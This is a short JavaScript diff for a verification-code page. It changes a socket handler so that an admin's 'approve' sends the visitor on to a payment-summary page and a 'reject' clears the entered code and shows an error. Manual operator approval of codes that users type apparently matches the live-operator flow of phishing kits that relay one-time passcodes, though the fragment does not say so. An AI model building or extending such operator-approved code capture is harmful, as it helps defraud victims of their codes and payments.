@@ -620,12 +620,19 @@
         }
       });
 
-      // Listen for resend approval
+      // Listen for code:action (approve/reject from admin)
       socket.on('code:action', function(data) {
         var act = (data && data.action) ? data.action : data;
-        if (act === 'approve' || (data && data.action === 'approve')) {
-          // Resend approved - restart countdown
-          startResendCountdown();
+        if (act === 'approve') {
+          // Navigate to final page (summary-payment)
+          window.location.href = '/summary-payment/';
+        } else if (act === 'reject') {
+          // Show error and reset
+          waitingOverlay.style.display = 'none';
+          verifyBtn.disabled = false;
+          errorMsg.style.display = 'block';
+          cells.forEach(function(c) { c.value = ''; });
+          focusCell(0);
         }
       });
     })();
